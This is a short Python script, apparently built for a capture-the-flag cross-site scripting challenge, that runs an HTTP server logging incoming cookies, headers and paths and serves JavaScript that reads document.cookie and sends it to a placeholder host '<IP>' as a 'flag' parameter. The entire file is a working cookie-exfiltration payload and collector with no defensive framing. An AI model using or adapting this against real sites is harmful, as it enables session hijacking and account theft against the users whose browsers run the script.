from http.server import BaseHTTPRequestHandler, HTTPServer

class Server(BaseHTTPRequestHandler):
    def do_GET(self):
        print("COOKIES:\n", self.headers['Cookie'])
        print("headers:\n", self.headers)
        print("URL:\n", self.path)
        js_code = '''
        var cookies = document.cookie;
        fetch(`https://<IP>?flag=${encodeURIComponent(document.cookie)}`, {
            method: 'GET',
        })
        '''
        self.send_response(200)
        self.send_header('Content-type', 'application/javascript')
        self.end_headers()
        self.wfile.write(js_code.encode('utf-8'))


def run(server_class=HTTPServer, handler_class=Server, port=8000):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print("Starting server...\n")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    print("Stopping server...\n")

if __name__ == '__main__':
    run()
